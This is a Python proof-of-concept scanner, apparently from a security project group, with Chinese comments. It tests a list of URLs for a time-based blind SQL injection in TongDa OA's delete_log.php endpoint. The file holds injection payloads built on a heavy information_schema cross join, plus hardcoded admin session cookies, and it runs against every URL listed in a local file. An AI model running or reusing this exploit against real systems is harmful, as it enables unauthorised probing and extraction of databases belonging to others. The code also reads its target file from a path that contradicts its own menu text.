import urllib
from urllib.parse import urljoin
import requests


class TongDa():
    def __init__(self):
        '''
        初始化定义两个payload，分别为注入payload与正常payload
        '''
        self.payloads1 = "/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1"
        self.payloads2 = "/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(83)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1"

    def get_response(self, url, headers, payloads):
        response = requests.get(urljoin(url, payloads), headers)
        return response

    def headers_work(self, url):
        '''
        解决访问头中的Host字段问题，通过urllib库提取url中的域名信息
        '''
        s = urllib.parse.urlparse(url).netloc
        headers = {
            'Host': s,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Cookie': 'PHPSESSID=be6qr3aebhqsash5ckuiimjgf5; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=296f6f32',
            'Connection': 'close'
        }
        return headers

    def parse(self):
        '''
        判断主函数
        '''
        for url in self.openurls():
            response1 = self.get_response(url=url, payloads=self.payloads1, headers=self.headers_work(url))
            response2 = self.get_response(url=url, payloads=self.payloads2, headers=self.headers_work(url))
            if response1.elapsed.total_seconds() > response2.elapsed.total_seconds():
                print(url + " 可能存在sql注入漏洞")
                print("*"*30)

    def menu(self):
        print('''
感谢使用观火项目组通达OAsql注入检测poc，请将待检测url填写到同级目录下的urls.txt文件中
        ''')

    def openurls(self):
        '''
        此函数用于读取用户给出的待检测URL地址，并进行处理
        '''
        url = []
        with open('../广联达OA sql注入/urls.txt', mode='r', encoding='utf8') as f:
            url = []
            ip = f.read().splitlines()
            for i in ip:
                url.append(i)
        return url

    def main(self):
        self.menu()
        self.parse()


if __name__ == '__main__':
    tongda = TongDa()
    tongda.main()
